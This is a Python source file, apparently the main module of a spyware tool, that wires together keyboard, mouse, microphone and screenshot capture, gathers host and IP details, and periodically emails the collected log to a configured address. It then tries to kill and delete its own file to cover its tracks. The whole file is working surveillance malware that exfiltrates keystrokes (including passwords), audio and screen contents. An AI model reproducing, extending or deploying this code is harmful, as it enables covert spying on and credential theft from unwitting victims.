import threading
import socket
import platform
import os
from keyboard_logger import KeyboardLogger
from mouse_logger import MouseLogger
from microphone_recorder import MicrophoneRecorder
from screenshot_capturer import ScreenshotCapturer
from config import EMAIL_ADDRESS, EMAIL_PASSWORD, Time_For_Report
from utils import send_mail


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

        self.keyboard_logger = KeyboardLogger(self.appendlog)
        self.mouse_logger = MouseLogger(self.appendlog)
        self.microphone_recorder = MicrophoneRecorder(self.appendlog)
        self.screenshot_capturer = ScreenshotCapturer(self.appendlog)

    def appendlog(self, string):
        self.log = self.log + string

    def report(self):
        send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    def run(self):
        self.system_information()
        self.report()
        threading.Thread(target=self.keyboard_logger.run).start()
        threading.Thread(target=self.mouse_logger.run).start()
        threading.Thread(target=self.microphone_recorder.record).start()
        threading.Thread(target=self.screenshot_capturer.capture).start()

        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is close.')
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " +  os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print('File is close.')

if __name__ == "__main__":
    keylogger = KeyLogger(Time_For_Report, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()

